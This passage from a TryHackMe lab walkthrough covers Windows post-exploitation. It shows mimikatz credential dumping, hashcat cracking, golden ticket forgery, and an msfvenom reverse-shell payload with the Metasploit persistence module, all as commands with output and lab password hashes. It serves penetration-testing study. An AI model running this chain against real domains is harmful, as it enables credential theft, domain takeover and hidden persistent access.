</pre></table></code></div></div><ul><li><p>Drag and drop the loot.zip folder into Bloodhound to import the .json files</p></li><li><p>Simple query: find all domain admins</p></li></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/simple-bloodhound-query.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/domain-admins.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/kerberoastable-users.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/bloodhound-answers.png" alt="" /></p><hr /><h2 id="mimikatz"><code class="language-plaintext highlighter-rouge">mimikatz</code></h2><p><code class="language-plaintext highlighter-rouge">mimikatz</code> is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network.</p><pre><code class="language-cmd">PS C:\Users\Administrator\Downloads&gt; .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51              
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                               
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )  
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz                    
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/ 
</code></pre><ul><li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege"><code class="language-plaintext highlighter-rouge">privilege::debug</code></a> (to be executed as an administrator) ask for <strong>SeDebugPrivilege</strong> in order to interact with the LSASS process:</li></ul><pre><code class="language-cmd">mimikatz # privilege::debug 
Privilege '20' OK 
</code></pre><h3 id="dumping-ntlm-hashes-and-cracking-them-using-hashcat">Dumping NTLM hashes and cracking them using <code class="language-plaintext highlighter-rouge">hashcat</code></h3><ul><li><code class="language-plaintext highlighter-rouge">lsadump::lsa /patch</code> dumps the NTLM password hashes:</li></ul><pre><code class="language-cmd">mimikatz # lsadump::lsa /patch 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
                                                              
RID  : 000001f4 (500)                                         
User : Administrator                                          
LM   :                                                        
NTLM : 2777b7fec870e04dda00cd7260f7bee6                       
                                                              
RID  : 000001f5 (501)                                         
User : Guest                                                  
LM   :                                                        
NTLM :                                                        
                                                              
RID  : 000001f6 (502)                                         
User : krbtgt                                                 
LM   :                                                        
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :  
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :  
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : bad1c9ba6b62479ab054c300c9adcbf5

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
</code></pre><ul><li>Cracking hashes w/ <code class="language-plaintext highlighter-rouge">hashcat</code></li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> <span class="o">&gt;</span> ntlm-hashes.txt                                                                                      
2777b7fec870e04dda00cd7260f7bee6         
5508500012cc005cf7082a9a89ebdfdf
64f12cddaa88057e06a81b54e73b949b
2b576acbe6bcfda7294d6bd18041b8fe
c39f2beb3d2ec06a62cb887fb391dee0
f4ab68f27303bcb4024650d8fc5f973a
c4b0e1b10c7ce2c4723b4e2407ef81a2
2777b7fec870e04dda00cd7260f7bee6
bad1c9ba6b62479ab054c300c9adcbf5
3c2d4759eb9884d7a935fe71a8e0f54c
7d33346eeb11a4f12a6c201faaa0d89a^C

<span class="nv">$ </span>hashcat <span class="nt">-m</span> 1000 ntlm-hashes.txt <span class="nv">$ROCKYOU</span> <span class="nt">--show</span>

64f12cddaa88057e06a81b54e73b949b:Password1
c39f2beb3d2ec06a62cb887fb391dee0:Password2
f4ab68f27303bcb4024650d8fc5f973a:MYpassword123#
c4b0e1b10c7ce2c4723b4e2407ef81a2:Password3
2777b7fec870e04dda00cd7260f7bee6:P@<span class="nv">$$</span>W0rd
</pre></table></code></div></div><blockquote><p><strong>Note</strong>: Cracking these hashes are note necessary if we can perform a Pass-The-Hash attack.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/dumping-hashes-answers.png" alt="" /></p><hr /><h3 id="golden-ticket">Golden Ticket</h3><p>We will first dump the hash and sid of the <strong>krbtgt</strong> user then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.</p><h4 id="dump-hash-and-sid-of-krbtgt">Dump hash and sid of krbtgt</h4><ul><li><code class="language-plaintext highlighter-rouge">lsadump::lsa /inject /name:krbtgt</code> → dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket:</li></ul><pre><code class="language-cmd">mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166 
                                                              
RID  : 000001f6 (502)                                         
User : krbtgt                                                 
                                                              
 * Primary                                                    
    NTLM : 5508500012cc005cf7082a9a89ebdfdf 
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

 * WDigest
    01  49a8de3b6c7ae1ddf36aa868e68cd9ea
    02  7902703149b131c57e5253fd9ea710d0
    03  71288a6388fb28088a434d3705cc6f2a
    04  49a8de3b6c7ae1ddf36aa868e68cd9ea
    05  7902703149b131c57e5253fd9ea710d0
    06  df5ad3cc1ff643663d85dabc81432a81
    07  49a8de3b6c7ae1ddf36aa868e68cd9ea 
    08  a489809bd0f8e525f450fac01ea2054b
    09  19e54fd00868c3b0b35b5e0926934c99
    10  4462ea84c5537142029ea1b354cd25fa
    11  6773fcbf03fd29e51720f2c5087cb81c
    12  19e54fd00868c3b0b35b5e0926934c99
    13  52902abbeec1f1d3b46a7bd5adab3b57
    14  6773fcbf03fd29e51720f2c5087cb81c
    15  8f2593c344922717d05d537487a1336d
    16  49c009813995b032cc1f1a181eaadee4
    17  8552f561e937ad7c13a0dca4e9b0b25a
    18  cc18f1d9a1f4d28b58a063f69fa54f27 
    19  12ae8a0629634a31aa63d6f422a14953
    20  b6392b0471c53dd2379dcc570816ba10
    21  7ab113cb39aa4be369710f6926b68094
    22  7ab113cb39aa4be369710f6926b68094
    23  e38f8bc728b21b85602231dba189c5be
    24  4700657dde6382cd7b990fb042b00f9e
    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f
    27  e69385ee50f9d3e105f50c61c53e718e
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3 

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4 
</code></pre><h4 id="create-a-golden-ticket">Create a Golden Ticket</h4><p>1) <code class="language-plaintext highlighter-rouge">kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500</code></p><pre><code class="language-cmd">mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfd
f /id:500
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 6/28/2021 9:43:47 AM ; 6/26/2031 9:43:47 AM ; 6/26/2031 9:43:47 AM
-&gt; Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
</code></pre><p>2) Open a new command prompt with elevated privileges to all machines with <code class="language-plaintext highlighter-rouge">misc::cmd</code>:</p><pre><code class="language-cmd">mimikatz # misc::cmd 
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF7609443B8
</code></pre><p>3) Within this new command prompt, access other machines:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/dir-desktop-1.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/psexec.png" alt="" /></p><hr /><h2 id="enumeration-w-server-manager">Enumeration w/ Server Manager</h2><p><strong>Server Manager</strong> is a built in windows feature. If we already have access to a domain admin account, then we can use it to change trusts, add or remove users, look at groups. etc.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/server-manager.png" alt="" /></p><hr /><h2 id="maintaining-access">Maintaining Access</h2><blockquote><p>TODO: look at advanced backdoors and rootkits, adding users and so on.</p></blockquote><h3 id="persistence-metasploit-module">Persistence metasploit module</h3><p>1) Generate a basic windows meterpreter reverse tcp shell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="si">$(</span>vpnip<span class="si">)</span> <span class="nv">LPORT</span><span class="o">=</span>5555 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
</pre></table></code></div></div><p>2) Transfer the payload from your attacker machine to the target machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>scp shell.exe Administrator@10.10.245.132:
Administrator@10.10.245.132<span class="s1">'s password: 
shell.exe       100%   72KB 559.7KB/s   00:00
</span></pre></table></code></div></div><p>3) Run a listener:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="nv">$ </span>msfconsole <span class="nt">-q</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting persistent handler<span class="o">(</span>s<span class="o">)</span>...
msf6 <span class="o">&gt;</span> use exploit/multi/handler
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using configured payload generic/shell_reverse_tcp
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload windows/meterpreter/reverse_tcp
payload <span class="o">=&gt;</span> windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> options 

Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:

   Name  Current Setting  Required  Description
   <span class="nt">----</span>  <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>


Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:

   Name      Current Setting  Required  Description
   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   EXITFUNC  process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
   LHOST                      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT     4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Wildcard Target


msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LPORT 5555
LPORT <span class="o">=&gt;</span> 5555
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST tun0
LHOST <span class="o">=&gt;</span> 10.11.35.147
msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.11.35.147:5555 
</pre></table></code></div></div><p>4) Execute <code class="language-plaintext highlighter-rouge">shell.exe</code> from Windows machine and go back to your <code class="language-plaintext highlighter-rouge">msfconsole</code> then background it:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>[*] Sending stage (175174 bytes) to 10.10.245.132
[*] Meterpreter session 1 opened (10.11.35.147:5555 -&gt; 10.10.245.132:49869) at 2021-06-28 18:45:10 +0200

meterpreter &gt; background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) &gt;
</pre></table></code></div></div><p>5) Use the persistence module:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> use exploit/windows/local/persistence
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>windows/local/persistence<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>session 1
session <span class="o">=&gt;</span> 1
msf6 exploit<span class="o">(</span>windows/local/persistence<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running persistent module against DOMAIN-CONTROLL via session ID: 1
<span class="o">[</span>+] Persistent VBS script written on DOMAIN-CONTROLL to C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\Y</span>ukvpk.vbs
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Installing as HKCU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un<span class="se">\s</span>QMgKDu
<span class="o">[</span>+] Installed autorun on DOMAIN-CONTROLL as HKCU<span class="se">\S</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un<span class="se">\s</span>QMgKDu
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Clean up Meterpreter RC file: /root/.msf4/logs/persistence/DOMAIN-CONTROLL_20210628.4733/DOMAIN-CONTROLL_20210628.4733.rc
</pre></table></code></div></div><hr /><h2 id="useful-links">Useful links</h2><ul><li><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView-3.0-tricks.ps1</a></li><li><a href="https://youtu.be/quIeOjjRT64">CONF@42 - Mimikatz - Mémoire Windows</a></li><li><a href="https://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos">Gentilkiwi - Golden Ticket</a></li><li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a></li><li><a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1">SharpHound.ps1</a></li><li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a></li><li><a href="https://blog.harmj0y.net/">https://blog.harmj0y.net/</a></li><li><a href="https://adsecurity.org/?page_id=1821">https://adsecurity.org/?page_id=1821</a></li><li><a href="https://metasploit.help.rapid7.com/docs/about-post-exploitation">https://metasploit.help.rapid7.com/docs/about-post-exploitation</a></li><li><a href="http://www.pentest-standard.org/index.php/Post_Exploitation">http://www.pentest-standard.org/index.php/Post_Exploitation</a></li><li><a href="https://offsec.red/mimikatz-cheat-sheet/">https://offsec.red/mimikatz-cheat-sheet/</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme-walkthroughs/'>TryHackMe walkthroughs</a>, <a href='/categories/windows/'>Windows</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/thm-windows/" class="post-tag no-text-decoration" >thm-windows</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >Active Directory</a> <a href="/tags/domain-controller/" class="post-tag no-text-decoration" >Domain Controller</a> <a href="/tags/kerberos/" class="post-tag no-text-decoration" >Kerberos</a> <a href="/tags/rdp/" class="post-tag no-text-decoration" >RDP</a> <a href="/tags/powerview/" class="post-tag no-text-decoration" >PowerView</a> <a href="/tags/sharphound/" class="post-tag no-text-decoration" >SharpHound</a> <a href="/tags/bloodhound/" class="post-tag no-text-decoration" >Bloodhound</a> <a href="/tags/mimikatz/" class="post-tag no-text-decoration" >mimikatz</a> <a href="/tags/password-cracking/" class="post-tag no-text-decoration" >password cracking</a> <a href="/tags/hashcat/" class="post-tag no-text-decoration" >hashcat</a> <a href="/tags/golden-ticket/" class="post-tag no-text-decoration" >Golden Ticket</a> <a href="/tags/msfvenom/" class="post-tag no-text-decoration" >msfvenom</a> <a href="/tags/backdoor/" class="post-tag no-text-decoration" >backdoor</a> <a href="/tags/metasploit-persistence-module/" class="post-tag no-text-decoration" >Metasploit persistence module</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp-prep</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe - Windows Post-exploitation basics - amirr0r&url=https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe - Windows Post-exploitation basics - amirr0r&u=https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TryHackMe - Windows Post-exploitation basics - amirr0r&url=https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/crto-review/">CRTO Review (Certified Red Team Operator) & Notion Templates</a></li><li><a href="/posts/htb-forest/">HackTheBox - Forest</a></li><li><a href="/posts/oscp-review/">OSCP Review (Cheat Sheet, Tmux Enumeration Scripts and Notion Templates)</a></li><li><a href="/posts/oscp-prep/">How do I prepare for the OSCP?</a></li><li><a href="/posts/htb-valentine/">HackTheBox - Valentine</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-forest/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 6, 2021 <i class="unloaded">2021-09-06T19:47:54+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Forest</h3><div class="text-muted small"><p> Forest is an easy HackTheBox virtual machine acting as a Windows Domain Controller (DC) in which Exchange Server has been installed. Anonymous LDAP binds are allowed, which we will use to enumerat...</p></div></div></a></div><div class="card"> <a href="/posts/thm-attackive-directory/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > May 19, 2021 <i class="unloaded">2021-05-19T08:40:04+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Attackive directory</h3><div class="text-muted small"><p> This room from TryHackMe cover attacks against a basic misconfigured Domain Controller via Kerberos enumeration, AS-REP Roasting, Impacket and Evil-WinRM. Setup # Impacket git clone https://githu...</p></div></div></a></div><div class="card"> <a href="/posts/thm-brainstorm/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Aug 10, 2021 <i class="unloaded">2021-08-10T19:55:11+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Brainstorm</h3><div class="text-muted small"><p> Brainstorm is a TryHackMe room that consists in reversing a chat program and exploiting a buffer overflow on a remote Windows machine. Enumeration 1 2 3 4 5 $ nmap -Pn -oN ports.txt 10.10.70.196 ...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/cyber-apocalypse-ctf-minefield/" class="btn btn-outline-primary"><p>Cyber Apocalypse CTF 2021 - Minefield (Pwn)</p></a> <a href="/posts/thm-attacking-kerberos/" class="btn btn-outline-primary"><p>TryHackMe - Attacking Kerberos</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//amirr0r-github-io.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/'; this.page.identifier = '/posts/thm-windows-post-exploitation-basics/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/amirr0r">amirr0r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://amirr0r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p 